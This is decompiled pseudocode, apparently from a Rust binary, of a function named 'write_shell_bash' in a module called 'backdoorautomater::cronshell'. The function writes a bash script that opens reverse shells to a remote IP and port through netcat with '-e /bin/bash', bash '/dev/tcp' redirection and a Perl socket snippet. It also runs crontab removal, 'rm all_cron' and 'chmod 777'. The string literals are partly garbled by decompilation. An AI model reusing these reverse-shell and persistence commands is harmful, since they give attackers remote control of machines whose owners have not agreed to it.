long long backdoorautomater::cronshell::write_shell_bash(struct_0 *a0, struct_0 *a1, struct_1 *a2)
{
    unsigned int v0;  // [bp-0x22c]
    int v1;  // [bp-0x228]
    unsigned long long v2;  // [bp-0x220]
    unsigned long long v3;  // [bp-0x218]
    int v4;  // [bp-0x208]
    unsigned long long v6;  // [bp-0x1f8]
    int v7;  // [bp-0x1c8]
    unsigned long long v8;  // [bp-0x1c0]
    unsigned long long v9;  // [bp-0x1b8]
    unsigned long long v10;  // [bp-0x1a8]
    char v11;  // [bp-0x1a0]
    int v12;  // [bp-0x188]
    unsigned long long v13;  // [bp-0x178]
    char v14;  // [bp-0x168], Other Possible Types: unsigned long
    unsigned int v15;  // [bp-0x164]
    void* v16;  // [bp-0x160], Other Possible Types: unsigned long long
    int v17;  // [bp-0x158]
    char v18;  // [bp-0x98]
    char v19;  // [bp-0x70]
    char v20;  // [bp-0x60]
    char v21;  // [bp-0x38]
    void* v23;  // r12
    int v26;  // xmm0
    int v27;  // xmm0
    int v28;  // xmm0

    v14.create(a2);
    if (*((int *)&v14))
    {
        v23 = v16;
        goto LABEL_46379f;
    }
    v0 = v15;
    v14.new("sh-cFailed to execute command*/crontab -rrm all_cron", 2);
    (char)v4.output(v14.arg("-cFailed to execute command*/crontab -rrm all_cron", 2).arg("ls /bin/ncls /bin/usr/nc#!/bin/bash\n\nREMOTE_IP=\"REMOTE_PORT=/bin/nc $REMOTE_IP $REMOTE_PORT -e /bin/bash 2>/dev/null &\n/bin/bash -c \'bash -i >& /dev/tcp// 0>&1\' 2>/dev/null &\n", 10));
    v18.expect(&(char)v4, &g_62a998);
    ::0x461180::core::ptr::drop_in_place<std::process::Command>(&v14);
    v14.new("sh-cFailed to execute command*/crontab -rrm all_cron", 2);
    (char)v4.output(v14.arg("-cFailed to execute command*/crontab -rrm all_cron", 2).arg("ls /bin/usr/nc#!/bin/bash\n\nREMOTE_IP=\"REMOTE_PORT=/bin/nc $REMOTE_IP $REMOTE_PORT -e /bin/bash 2>/dev/null &\n/bin/bash -c \'bash -i >& /dev/tcp// 0>&1\' 2>/dev/null &\n", 14));
    v20.expect(&(char)v4, &g_62a9b0);
    ::0x461180::core::ptr::drop_in_place<std::process::Command>(&v14);
    if (*((long long *)&v19) && *((long long *)&v21))
    {
        v23 = v0.write_all("#!/bin/bash\n\nREMOTE_IP=\"REMOTE_PORT=/bin/nc $REMOTE_IP $REMOTE_PORT -e /bin/bash 2>/dev/null &\n/bin/bash -c \'bash -i >& /dev/tcp// 0>&1\' 2>/dev/null &\n", 13);
        if (!v23)
        {
            v23 = v0.write_all("/bin/bash -c 'bash -i >& /dev/tcp// 0>&1' 2>/dev/null &\n", 34);
            if (!v23)
            {
                v23 = v0.write_all(*((long long *)&a1->field_8), *((long long *)&a1[1].padding_0[7]));
                if (!v23)
                {
                    v23 = v0.write_all("/ 0>&1' 2>/dev/null &\n", 1);
                    if (!v23)
                    {
                        v23 = v0.write_all(*((long long *)&a0->field_8), *((long long *)&a0[1].padding_0[7]));
                        if (!v23)
                        {
                            v23 = v0.write_all(" 0>&1' 2>/dev/null &\n", 21);
                            if (!v23)
                                goto LABEL_4637de;
                            goto LABEL_46377c;
                        }
                    }
                }
            }
        }
    }
    else
    {
        v23 = v0.write_all("#!/bin/bash\n\nREMOTE_IP=\"REMOTE_PORT=/bin/nc $REMOTE_IP $REMOTE_PORT -e /bin/bash 2>/dev/null &\n/bin/bash -c \'bash -i >& /dev/tcp// 0>&1\' 2>/dev/null &\n", 13);
        if (!(!v23))
            goto LABEL_46377c;
        v26 = *((int128_t *)&a1->field_8);
        v14 = "REMOTE_IP=\"REMOTE_PORT=/bin/nc $REMOTE_IP $REMOTE_PORT -e /bin/bash 2>/dev/null &\n/bin/bash -c \'bash -i >& /dev/tcp// 0>&1\' 2>/dev/null &\n";
        v16 = 11;
        v17 = v26;
        alloc::str::join_generic_copy(&(char)v4, &v14, 2, 1, 0);
        v3 = v6;
        v1 = v4;
        (char)v1.extend_from_slice("\"\n\n\nls /bin/ncls /bin/usr/nc#!/bin/bash\n\nREMOTE_IP=\"REMOTE_PORT=/bin/nc $REMOTE_IP $REMOTE_PORT -e /bin/bash 2>/dev/null &\n/bin/bash -c \'bash -i >& /dev/tcp// 0>&1\' 2>/dev/null &\n", 2);
        v23 = v0.write_all(v2, v3);
        if (!v23)
        {
            v27 = *((int128_t *)&a0->field_8);
            v14 = "REMOTE_PORT=/bin/nc $REMOTE_IP $REMOTE_PORT -e /bin/bash 2>/dev/null &\n/bin/bash -c 'bash -i >& /dev/tcp// 0>&1' 2>/dev/null &\n";
            v16 = 12;
            v17 = v27;
            alloc::str::join_generic_copy(&(char)v4, &v14, 2, 1, 0);
            v9 = v6;
            v7 = v4;
            (char)v7.extend_from_slice("\n\nls /bin/ncls /bin/usr/nc#!/bin/bash\n\nREMOTE_IP=\"REMOTE_PORT=/bin/nc $REMOTE_IP $REMOTE_PORT -e /bin/bash 2>/dev/null &\n/bin/bash -c \'bash -i >& /dev/tcp// 0>&1\' 2>/dev/null &\n", 2);
            v23 = v0.write_all(v8, v9);
            if (!v23)
            {
                v23 = v0.write_all("/bin/nc $REMOTE_IP $REMOTE_PORT -e /bin/bash 2>/dev/null &\n/bin/bash -c 'bash -i >& /dev/tcp// 0>&1' 2>/dev/null &\n", 59);
                if (!(!v23))
                    goto LABEL_463768;
                ::0x461160::core::ptr::drop_in_place<alloc::string::String>(&(char)v7);
                ::0x461160::core::ptr::drop_in_place<alloc::string::String>(&(char)v1);
            }
            else
            {
LABEL_463768:
                ::0x461160::core::ptr::drop_in_place<alloc::string::String>(&(char)v7);
                goto LABEL_463772;
            }
LABEL_4637de:
            v28 = *((int128_t *)&(&a2->padding_0)[1]);
            v14 = "chmod 777 ;\nuse Socket;\n$p=socket(S,PF_INET,SOCK_STREAM,getprotobyname(\'tcp\'));\nif(connect(S,sockaddr_in($p,inet_aton($i)))){\nopen(STDIN,\'>&S\');\nopen(STDOUT,\'>&S\');\nopen(STDERR,\'>&S\');\nexec(\'/usr/bin/bash -i\');\n};\n\"\n\n\nls /bin/ncls /bin/usr/nc#!/bin/bash\n\nR";
            v16 = 10;
            v17 = v28;
            alloc::str::join_generic_copy(&(char)v4, &v14, 2, 1, 0);
            v13 = v6;
            v12 = v4;
            v14.new("sh-cFailed to execute command*/crontab -rrm all_cron", 2);
            v6 = v13;
            v4 = v12;
            v4.output(v14.arg("-cFailed to execute command*/crontab -rrm all_cron", 2).arg(&v4));
            (char)v7.expect(&v4, &g_62a9c8);
            ::0x461180::core::ptr::drop_in_place<std::process::Command>(&v14);
            v4.from_utf8_lossy(v10, *((long long *)&v11));
            v14.to_vec(v4.deref(), a2);
            v3 = (long long)v17;
            *((int128_t *)&v1) = *((int128_t *)&v14);
            ::0x461220::core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v4);
            backdoorautomater::sanitizer::sanitize_system_command(&(char)v1);
            ::0x461160::core::ptr::drop_in_place<alloc::string::String>(&(char)v1);
            ::0x461120::core::ptr::drop_in_place<std::process::Output>(&(char)v7);
            ::0x461120::core::ptr::drop_in_place<std::process::Output>(&v20);
            ::0x461120::core::ptr::drop_in_place<std::process::Output>(&v18);
            ::0x461110::core::ptr::drop_in_place<std::fs::File>(v0);
            ::0x461160::core::ptr::drop_in_place<alloc::string::String>(a2);
            ::0x461160::core::ptr::drop_in_place<alloc::string::String>(a1);
            v23 = 0;
        }
        else
        {
LABEL_463772:
            ::0x461160::core::ptr::drop_in_place<alloc::string::String>(&(char)v1);
LABEL_46377c:
            ::0x461120::core::ptr::drop_in_place<std::process::Output>(&v20);
            ::0x461120::core::ptr::drop_in_place<std::process::Output>(&v18);
            ::0x461110::core::ptr::drop_in_place<std::fs::File>(v0);
LABEL_46379f:
            ::0x461160::core::ptr::drop_in_place<alloc::string::String>(a2);
            ::0x461160::core::ptr::drop_in_place<alloc::string::String>(a1);
        }
    }
    ::0x461160::core::ptr::drop_in_place<alloc::string::String>(a0);
    return v23;
}
